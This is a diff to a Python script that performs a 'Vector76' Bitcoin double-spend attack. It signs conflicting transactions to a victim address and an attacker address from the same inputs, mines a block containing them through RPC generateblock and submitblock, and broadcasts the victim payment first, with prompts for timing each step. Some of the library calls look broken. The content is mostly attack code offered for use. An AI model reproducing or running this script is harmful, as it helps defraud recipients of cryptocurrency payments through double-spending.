@@ -1,15 +1,11 @@
-import time
 import argparse
-import bitcoincli.client
 import requests
 import subprocess
 
+from bitcoin.rpc import Proxy
 from bitcoin import *
-from cryptos import *
 from datetime import datetime
 from hashlib import sha256
-from bitcoinaddress import Wallet
-import bitcoincli
 
 testnet = True #Network Option
 
@@ -196,15 +192,15 @@ amount_btc = args.amount_of_coins
 
 
 fee = 15000
-transaction_util = Bitcoin(testnet=testnet)
+transaction_util = bitcoin.core(testnet=testnet)
+bitcoin.SelectParams("mainnet")
+if testnet:
+    bitcoin.SelectParams("testnet")
 print("Connecting Public Node...")
-rpc_node = bitcoincli.Bitcoin(rpchost=rpc_host,
-                              rpcport=rpc_port,
-                              rpcuser=username,
-                              rpcpasswd=password)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
-print(rpc_node.getblockchaininfo())
+rpc_node = Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
+                 service_port=rpc_port)
+print(rpc_node.getinfo())
 print("OK")
-#key   = transaction_util.encode_privkey(key, "wif")
 send_amount = to_satoshi(amount_btc)
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
@@ -212,17 +208,23 @@ tx_victim = [{"address": victim_address, "value": send_amount}]
 tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
 print(tx_victim)
-tx_victim = serialize(transaction_util.signall(tx_victim, key))
+tx_victim = bitcoin.core.serialize(transaction_util.signall(tx_victim, key))
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
-tx_attacker = serialize(transaction_util.signall(tx_attacker, key))
+tx_attacker = bitcoin.core.serialize(transaction_util.signall(tx_attacker, key))
 print()
 print()
 tx_vector76 = f"{tx_attacker}{tx_victim}"
+print("sending vector76 block Your Node...")
+result = rpc_node.sendrawtransaction(tx_vector76)
+print(result)
 print("Mining Vector76 Block...")
-rpc_node.sendrawtransaction(tx_vector76)
-rpc_node.generateblock(f'"{attacker_address}",["{tx_vector76}"],false')
+payload = [attacker_address, [tx_vector76], False]
+print(f"Payload : {payload}")
+vector76_respone = rpc_node.call("generateblock", payload)
+print(f"Mining Response : {vector76_respone}")
+print()
 #result = rpc_node.sendrawtransaction(f"['{vector76_tx}']")
 print("--------------------")
 print(f"Victim      : {victim_address}")
@@ -232,32 +234,24 @@ print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
 print(f"Signed V1 RawTx           : {tx_victim}")
 print(f"Signed V2 RawTx           : {tx_attacker}")
 print(f"Vector76  Block           : {tx_vector76}")
+print(f"Mined Vector76 Block      : {vector76_respone}")
 print("--------------------")
 print()
 print()
 print("[+] READY...")
 print()
 input(" --- Press the enter key to continue the Vector76 attack... --- ")
-#print(amount_satoshi)
 print()
 print("OK")
 print("push V1 TX...")
 broadcast_transaction(tx_victim, testnet)
 #print()
 input("--- Send the block after pressing the enter key. --- ")
-print(f"Broadcast Vector76 Block...")
+print(f"Send Vector76 Block...")
+result = rpc_node.submitblock(tx_vector76)
+print(result)
+print()
 broadcast_transaction(tx_vector76, testnet)
-#broadcast_transaction(tx_attacker, testnet)
-#rpc_node.submitblock(f"'{tx_vector76}'")
-#transaction_util.pushtx(vector76_tx)
-#transaction_util.pushtx(vector76_block)
-#vector76_block = rpc_node.submitblock(f'{vector76_tx}')
-#miner = Wallet()
-#print(miner)
-#print(f"Submit Vector76 Block...   : {vector76_block}")
-#print()
-#result = rpc_node.submitblock(vector76_block)
-#print(f"Vector76 rawtx: {vector76_tx}")
 print()
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
@@ -265,11 +259,8 @@ print()
 
 sound_name = "ImagineBreaker.mp3"
 try:
-    import mp3play
-    clip = mp3play.load(sound_name)
-    clip.play()
-    time.sleep(min(5, clip.seconds()))
-    clip.stop()
+    import soundplay
+    soundplay.playsound(sound_name)
 except:
     # Termux Only
     imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
